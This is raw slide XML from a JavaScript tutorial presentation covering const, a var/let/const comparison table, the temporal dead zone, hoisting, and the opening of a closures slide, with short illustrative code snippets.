              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> no longer exists</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" b="1" dirty="0"/>
              <a:t>const</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> to define "constants". Constants are block-scoped, much </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400"/>
              <a:t>like variables </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>defined using the let statement. The value of a constant cannot change through reassignment, and it can't be redeclared.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>const ALLOWED_NAMES = ["Python", "JavaScript"];</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ALLOWED_NAMES.push</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("ECMAScript"); // works!</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ALLOWED_NAMES = ["PHP"];  /* will trigger </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TypeError</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: Assignment to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>constant variable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. */</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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8B626BD-E125-42A1-9662-BBD8C1224DA8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>var, let and const cheat sheet</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Taulukko 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B25B9CB1-24E9-4D44-9404-354493E5E544}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1881896743"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="1854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3224578180"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1497360">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3902446256"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2160240">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1501654460"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1828800">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2848920853"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1828800">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="894430172"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1828800">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1985507902"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" noProof="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0"/>
                        <a:t>Block Scoped</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Temporal Dead Zone </a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Creates Global</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0" err="1"/>
                        <a:t>Reassignable</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0" err="1"/>
                        <a:t>Redeclarable</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3301967449"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>none</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1089479646"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>var</a:t>
                      </a:r>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tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2397785935"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>let</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1079711157"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>const</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>X</a:t>
                      </a:r>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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3654731061"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Tekstiruutu 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6A6EDC4-F3ED-4B4B-A0FA-C5B2B8280CD6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1487488" y="3636962"/>
            <a:ext cx="9433048" cy="3046988"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Temporal dead zone</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t> prevents access to let and const declarations before their initialization. </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Let and const don't allow declaration:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</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x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"cat"</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redeclaration successful</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>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y</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a:t>
            </a:r>
          </a:p>
          <a:p>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y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"cat"</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redeclaration fails</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" sz="2400" dirty="0">
              <a:latin typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37444420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E92AE226-42A9-4401-9154-61AA8048390E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Hoisting</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63491" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90DEE46A-DC85-48C6-8CCC-AA823913749F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="911424" y="1390767"/>
            <a:ext cx="10440988" cy="5069160"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>JavaScript implicitly moves var declarations to top, which is called hoisting:</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function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</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    console.log(x);</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a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(); // undefined, instead </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ReferenceError</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: x is not defined</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var x = 5;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>is same as:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="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var x;</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function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</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    console.log(x);</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a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x = 5;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>But let and const declarations are not hoisted like this, they have temporal dead zone. Because most JS programmers are unaware of hoisting, it is highly recommended to put ALL your declarations to the start of code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404"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2824976-4FC6-4A8D-B499-E12DE5E203BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Closures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EB608EAE-6C31-456C-8211-6D0A52C775A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>What is a closure? (you need to satisfy all three below)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Closure is a nested function (inner function inside an outer function). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
